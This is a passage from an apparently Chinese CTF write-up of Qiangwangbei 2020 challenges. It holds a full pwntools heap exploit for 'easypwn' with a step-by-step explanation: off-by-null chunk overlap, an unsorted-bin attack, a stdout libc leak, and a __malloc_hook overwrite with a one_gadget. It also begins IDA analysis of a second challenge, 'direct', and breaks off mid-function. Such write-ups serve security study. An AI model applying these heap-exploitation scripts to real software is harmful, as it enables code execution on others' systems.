    edit_n<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
    stdout <span class="token operator">=</span> <span class="token number">0x55dd</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span>
    edit_n<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
    edit_n<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
    edit_n<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c5600</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
    libc_realoc <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>
    one_gadget <span class="token operator">=</span> libc_base<span class="token operator">+</span>onegadget<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_realoc => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_realoc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>
    edit_n<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
    edit_n<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># gdb.attach(io)</span>

    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> io
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./easypwn'</span><span class="token punctuation">)</span>
            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>逐步讲解</p>
<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>
dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre>
<p>这一段的作用是在堆中留下main_arena的地址，方便后续利用</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C1.jpg" alt=""></p>
<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>
add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span></code></pre>
<p>申请chunk，并于上次申请的chunk的位置错开，如下</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C2.jpg" alt=""></p>
<p>可以看到main_arena的地址已经落到了第二个chunk中</p>
<pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
edit_0<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre>
<p>这段用来off-by-null，构造chunkoverlap，dele掉第一个0x71的chunk，再将0x101这个chunk的<strong>prev_size</strong>设置为前三个chunk的size之和，再将其dele掉，如此chunk3便会通过<strong>prev_size</strong>找到chunk0，中间两个chunk也被划入了其中，如下</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C3.jpg" alt=""></p>
<p>实际上chunk1和chunk2依然是使用状态</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C4.jpg" alt=""></p>
<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 6</span>
add<span class="token punctuation">(</span><span class="token number">0xb8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 7</span></code></pre>
<p>这一段的作用是将unsortedbin重新分割，并且要与chunk1和chunk2错位，需要能够通过这次分配的chunk来控制chunk1和chunk2，如下：</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C5.jpg" alt=""></p>
<p>如上图所示我们成功构造了chunkoverlap，chunk1被包含在了chunk0之中，chunk2被包含在了chunk3之中</p>
<pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
global_max_fast <span class="token operator">=</span> <span class="token number">0x67f8</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span>
edit_n<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre>
<p>这一段先将chunk3删除掉，露出main_arena，然后通过chunk1修改chunk3的bk指针为global_max_fast-0x10，如下</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C6.jpg" alt=""></p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C7.jpg" alt=""></p>
<p>我们成功修改了bk指针，将其指向了global_max_fast-0x10，几率为1/16</p>
<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
stdout <span class="token operator">=</span> <span class="token number">0x55dd</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span>
edit_n<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
edit_n<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre>
<p>add(0x68)来触发unsortedbin attack，使main_arena+88落入global_max_fast,这样后续我们就能够使用fastbin了</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C8.jpg" alt=""></p>
<p>我们接着dele(3)dele(6),由于chunk3和chunk6都是0x70大小，因此他们都会被链入0x70大小的fastbin中，chunk6的fd处会写入chunk3的地址</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C9.jpg" alt=""></p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C10.jpg" alt=""></p>
<p>接着我们通过chunk2来修改chunk6的fd指向我们一开始分配并且删除的一个chunk</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C11.jpg" alt=""></p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C12.jpg" alt=""></p>
<p>接着我们再通过chunk1修改0x55faa8fba0b0处chunk的fd指针的后四位为IO_2_1_stdout_-0x43的后四位</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C13.jpg" alt=""></p>
<p>这样我们通过连续申请三个0x68大小的chunk就能申请到IO_2_1_stdout_-0x43处</p>
<pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
edit_n<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c5600</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>申请过去之后修改stdout结构体的值来泄露libc地址</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C14.jpg" alt=""></p>
<pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>
edit_n<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
edit_n<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre>
<p>有了libc地址有fastbin，再故技重施，dele chunk3，利用chunk2修改其fd指向malloc_hook-0x23处，利用onegadget劫持程序流即可</p>
<h3 id="0x2-direct"><a href="#0x2-direct" class="headerlink" title="0x2.direct"></a>0x2.direct</h3><p>保护全开</p>
<p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5C15.jpg" alt=""></p>
<p>IDA分析</p>
<p>程序开头有一个sleep(0xA)的函数，把它nop掉</p>
<p>一共有五个功能</p>
<pre class=" language-c"><code class="language-c">__int64 <span class="token function">sub_E95</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"1. allocate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"2. edit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"3. show"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"4. open file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"5. close file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"6. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Your choice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>依次分析</p>
<p>首先是allocate</p>
<pre class=" language-c"><code class="language-c">size_t __fastcall <span class="token function">add</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  size_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>
  size_t size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> qword_202100<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      result <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
      size <span class="token operator">=</span> result<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0x100</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        v5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          qword_202100<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>
          qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>
          result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
          result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"allocate failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>最多分配16个chunk，最大能分配0x100的chunk</p>
<p>再看到edit</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">edit</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rcx</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  size_t nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_2020E0<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_2020E0 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v5 <span class="token operator">=</span> result<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>result <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      result <span class="token operator">=</span> qword_202100<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Offset: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v6 <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Offset: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v3 <span class="token operator">=</span> <span class="token function">sub_B11</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        nbytes <span class="token operator">=</span> v3<span class="token punctuation">;</span>
        v4 <span class="token operator">=</span> v6 <span class="token operator">+</span> v3<span class="token punctuation">;</span>
        result <span class="token operator">=</span> qword_202060<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;=</span> result <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>qword_202100<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">+</span> v6<span class="token punctuation">)</span><span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
          result <span class="token operator">=</span> <span class="token function">sub_A89</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>首先会检查<code>dword_2020E0</code>的值是否存在，存在的话就进入edit功能</p>
<p>我们输入一个偏移量和要修改的size，然后程序会检查偏移量+size是否会超出这个chunk的size，如果没有超过就从chunk的起始位置+偏移量处开始写值。但这里有问题，if判断值检查了是否存在下溢，没有检查上溢，而offset又是有符号整型，所以这题的漏洞点就在edit功能中。</p>
<p>再看到show函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">show</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>

  <span class="token function">sub_A5A</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
